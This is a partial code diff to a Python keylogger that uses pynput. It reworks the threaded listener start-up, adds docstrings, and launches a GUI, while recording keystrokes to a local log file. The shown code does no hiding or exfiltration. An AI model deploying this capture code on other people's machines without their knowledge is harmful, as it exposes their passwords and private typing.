@@ -4,8 +4,7 @@ import threading
 from pynput.keyboard import Key, Listener
 
 listener = None
-
-# File to log the keys
+listener_thread = None
 log_file = "log.txt"
 
 # Used to write whatever keys are pressed to a
@@ -37,6 +36,7 @@ def write_to_file(key: string):
             file.write(key_data)
 
 def clear_file():
+    """Clears the log file content and writes a start message."""
     with open(log_file, "w") as file:
         file.write("Keylogger started...\n\n")
 
@@ -67,29 +67,22 @@ def on_release(key: string):
     """
     if key == Key.esc:
         print('Escape pressed.')
-        return False # If ret is false the program will close
-
-# Main function to start the keylogger
+        return False
+# Start the keylogger in a separate thread
 def start_keylogger():
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        """
-        Starts the keylogger on a different thread, different from the GUI.
-        The key presses and releases trigger specific callback functions. 
-        The listener runs in the background and monitors the keyboard events for input.
-
-        Args:
-            on_press (function): A callback function that is called when a key is pressed.
-            on_release (function): A callback function that is called when a key is released.
-        """
-        print("Starting keylogger...")
-        listener = Listener(on_press=on_press, on_release=on_release)
-        listener.start()
+    global listener
+    listener = Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    listener.wait()  # Ensures the listener is ready before the GUI continues
 
 def start_keylogger_thread():
-    """Runs the keylogger in a thread to keep the GUI responsive."""
-    keylogger_thread = threading.Thread(target=start_keylogger)
-    keylogger_thread.daemon = True
-    keylogger_thread.start()
+    """Runs the keylogger in a separate thread to keep the GUI responsive."""
+    global listener_thread
+    if listener_thread is None or not listener_thread.is_alive():
+        listener_thread = threading.Thread(target=start_keylogger)
+        listener_thread.daemon = True
+        listener_thread.start()
+        print("Keylogger started.")
 
 def stop_keylogger():
     """Stops the keylogger."""
@@ -116,4 +109,4 @@ def create_gui():
 
 if __name__ == "__main__":
     clear_file()
-    start_keylogger()
+    create_gui()
